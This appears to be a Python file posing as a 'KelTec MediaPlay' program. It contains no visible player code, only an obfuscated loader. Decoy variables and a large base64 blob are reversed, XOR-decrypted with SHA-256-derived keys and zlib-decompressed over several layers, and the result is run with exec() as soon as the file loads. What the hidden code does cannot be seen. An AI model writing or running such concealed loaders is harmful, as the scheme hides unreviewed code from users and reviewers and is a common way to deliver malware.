# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 343309 ^ 666494
_lx1_1 = len("5180d0")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-865736)
_lx3_3 = 229261 * 0
_lx4_4 = 734849 ^ 122184
_K = 'd8f66e43ef319550b1ed50abacd76ae0c100d65e336b154aa716d24346c53497'
_M = 'V6ktE98uy1SJlN1uoPnEN6o6jrUhBZOeBjyNyFOogGdWoi9XnHKJVtKUgmP08sMwozqJtyoBxsoJYdiZCPmGbwT0LFDOI9gC1cCE'
_D = 'Og2r8b7v+dzyiSb/KNkB8dQ0ZlUCnaplLlgaKJ2d1fken/7oLPnxfQAYD9Mhb3XxcL9++xrodqXaqLvZ1oLklVGTxRE9T7Vbe75AbeiO4ZMywnaFwgwwHp/ZklwcrYDGZtwqVUBA6OZjsVZbAeTW2d7XVqqF+rgKL6yexM8CRcfbTJk0Gt3BJyXlLJFJ32kKxDB9hEI/QOGzeX13POJzgTHA+l/PbbRHVq7qzXvKJThBnT2w1RAvnsPauygAzRa6o2JRknE7WSW/f6ELNxLohLSM3rd2Fjya9YbCDZPEQDHmSTUaoeSwVKaG7uezHfgZCSX10Z4dwspGFm55JEZrKr3ijPBjBUR1T3SXfg3ATcJumKEeEA+xhfse0FKYOuEIF5b0EFomaCq6vmdhRa/T4l1QNBsD7A8qd1+l+XEAsbfnrrJsewPgQ0RSSlr3JwenuBsawNWYa1GD9iYeW/8lN1KCY/aanGDS0Tj8w8oercoOZ70fpG4Xvvw1rvqiL2FGPT7CoqDUQ+edpV73W7aC1hygKk92Lihopjw+VTPeU11ekR3/3Vjok8zf6ZQXiKaGTebCUcz9YatAO96Qea4mkNeEh2cwSG2HoHO3glO+qWZzfAW+WwO4UIwdreLgw8t07BZnUFJ11OCWghUGtXcBIIPADVx/fqwgRbVqKZ81QowhLbzzOBontDXw1muztoO0R5wC56rFP5wJnfJnqtF6o0reSUmFtCZ7YVHHDemIbP3WJ41iPg0Adgk/tOx7rKY9ta9dYOQ/h7IHC8RHOGfiMHRE3CCu3IUcPGhoxXF8gPDeMH4M3GbcJZWDtDWylmXGFYaM+95Me9OP/0GdM2XV4QxEpI2pDd/wBjIgrBNOV8NOPthyx1LTMxADvR/LjXz8QRSahnqe0AlSgC2tcnpRexZF8EEN2t1Wsw73K/8unjg+mBFzzUO/uY2WZ5VLALewjRpe/BmrpQcya0F20L2RZeOwR009jjRjVUkiqYlo/fFzLksPw73b7tdtG19LvJ7VA+pZze17VECSbwAmygIAq/ETTqosSbGcLldWTDdZBd5POfZyi0+A/RE2zchboqaB9BKYzlpS/m7lLcJeq0Ew0OfD48HuZ+KBoYtfprisIbPutdSn4uajUpJOhGwPEKD2zN8HNFObWT9nlpImn9xHFs7shf9jlwsr1LtMjrqVqGfG8gm+ksun5Q6Z7CgVV43hGEaRtp81WeIld/prINrjPCe7dUffx2snTl9nBE0qeRDAQaDCRjHNxCKseBIbE5ONc7mw50t8c+oTX4nfNIhOPOiO8+cZRIHhtkC/PkLFZapOX3PggF4LQ4Vo/NdEoQHriT5rbTLfkyAFoshAjnfLADZeMGZZQYwWmU1GCwVT8o4GT7txVBxh1JYkiJZmh7YKOogFelXmyHHiOuK35DV375b+Aldv0vCy8w9LZnYPnhan9mPOkhCkTuoHi6bE+IGokQtrVSvDNZNrenJRdfGwHwetxYFeR1bEzRFBhnxuITTKql5eeKjzmVxiobIbMvQsSKLEDH/Xl9IFEqJgkpgYp3Lw6ja1IPU0mGFFsetD/KwNb/7imwyI+nzpKGNor4PKOFcgOFf2p5UFAL/vP4C02AvRwOToHzlcpsmbt3ULOBo2'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})